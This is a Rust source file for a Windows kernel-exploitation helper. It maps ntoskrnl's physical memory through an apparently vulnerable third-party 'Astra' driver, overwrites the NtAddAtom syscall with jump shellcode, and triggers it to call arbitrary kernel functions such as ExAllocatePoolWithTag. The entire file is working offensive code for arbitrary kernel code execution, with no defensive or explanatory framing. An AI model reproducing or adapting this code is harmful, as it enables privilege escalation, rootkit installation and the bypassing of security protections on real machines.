use std::collections::HashMap;

use crate::system;
use superfetch::MemoryMap;

use crate::{
    astra::AstraDriver,
    system::{Paddr, Vaddr, translate_v2p},
};

pub struct Kernel {
    vaddr: Vaddr,
    paddr: Paddr,
    exports_map: HashMap<String, usize>,
    mapped: &'static mut [u8],
}

impl Kernel {
    pub fn new() -> Self {
        unsafe {
            //Get exports
            let ntoskrnl_bytes = std::fs::read("C:\\Windows\\System32\\ntoskrnl.exe").unwrap();
            let ntoskrnl_object = match goblin::Object::parse(&ntoskrnl_bytes).unwrap() {
                goblin::Object::PE(pe) => pe,
                _ => {
                    panic!("ntoskrnl is not a PE O_o")
                }
            };

            //Using string is kinda meh but i'm not ready for rust strings yet.
            let mut exports_accel: HashMap<String, usize> = HashMap::new();
            for e in ntoskrnl_object.exports {
                exports_accel.insert(e.name.unwrap().to_owned(), e.rva);
            }
            //Find vaddr and paddr
            let ntoskrnl_vaddr = system::get_kernel_module_address("ntoskrnl")
                .expect("Failed to get ntoskrnl address");
            let mm = match MemoryMap::snapshot() {
                Ok(m) => m,
                Err(_) => panic!("Failed to take memorymap snapshot"),
            };
            let ntoskrnl_page_paddr = translate_v2p(&mm, ntoskrnl_vaddr & !0xFFF);
            println!("[+] ntoskrnl paddr: {:X}", ntoskrnl_page_paddr);

            //Map ntoskrnl
            let astra = AstraDriver::open().expect("Failed to open astra driver");
            let mapped = astra
                .map_slice(ntoskrnl_page_paddr as u64, 0x1000000)
                .unwrap();

            Self {
                vaddr: ntoskrnl_vaddr,
                paddr: ntoskrnl_page_paddr,
                exports_map: exports_accel,
                mapped: mapped,
            }
        }
    }

    pub fn get_export_raw<S: AsRef<str>>(&self, name: S) -> Option<usize> {
        if let Some(exp) = self.exports_map.get(name.as_ref()) {
            return Some(*exp);
        }
        None
    }

    pub fn get_export<S: AsRef<str>>(&self, name: S) -> Option<usize> {
        if let Some(exp) = self.exports_map.get(name.as_ref()) {
            return Some(self.vaddr + exp);
        }
        None
    }

    pub fn ex_allocate_pool_with_tag(&mut self, size: usize, tag: u32) -> u64 {
        //Get nt_add_atom raw offset
        let nt_add_atom = self.get_export_raw("NtAddAtom").unwrap();
        //Prepare shellcode to replace NtAddAtom
        let shellcode =
            Self::get_patched_shellcode(self.get_export("ExAllocatePoolWithTag").unwrap() as u64);

        let nt_add_atom_slice = &mut self.mapped[nt_add_atom..nt_add_atom + shellcode.len()];

        //Save old bytes we will use them after call to restore original function
        let mut old_bytes = Vec::new();
        old_bytes.extend_from_slice(nt_add_atom_slice);
        //Patch NtAddAtom
        nt_add_atom_slice.copy_from_slice(&shellcode);
        //Call NtAddAtom
        let mut out: u64 = 0;
        unsafe {
            std::arch::asm!(
            //                "mov r10, 0x0",
            //                "mov rdx, 0x1000",
            //                "mov r8, 0x41414141",
                            "mov eax, 0x47",
                            "syscall",
                            in("r10") 0x0,
                            in("rdx") size,
                            in("r8") tag,
                            out("rax") out,
                        );
        }
        //Restore original function
        nt_add_atom_slice.copy_from_slice(&old_bytes);

        out
    }

    pub fn jump_to(&mut self, func: u64) {
        let nt_add_atom = self.get_export_raw("NtAddAtom").unwrap();
        //Prepare shellcode to replace NtAddAtom
        let shellcode = Self::get_patched_shellcode(func);

        let nt_add_atom_slice = &mut self.mapped[nt_add_atom..nt_add_atom + shellcode.len()];

        //Save old bytes we will use them after call to restore original function
        let mut old_bytes = Vec::new();
        old_bytes.extend_from_slice(nt_add_atom_slice);
        //Patch NtAddAtom
        nt_add_atom_slice.copy_from_slice(&shellcode);
        //Call NtAddAtom
        unsafe {
            std::arch::asm!(
                //                "mov r10, 0x0",
                //                "mov rdx, 0x1000",
                //                "mov r8, 0x41414141",
                "mov eax, 0x47",
                "syscall",
            );
        }
        //Restore original function
        nt_add_atom_slice.copy_from_slice(&old_bytes);
    }

    fn get_patched_shellcode(kernel_func: u64) -> Vec<u8> {
        let jmp_patch_template = include_bytes!("jmp_patch.bin");
        let mut jmp_patch = jmp_patch_template.clone();
        jmp_patch[2..10].copy_from_slice(&kernel_func.to_ne_bytes());
        jmp_patch.to_vec()
    }
}
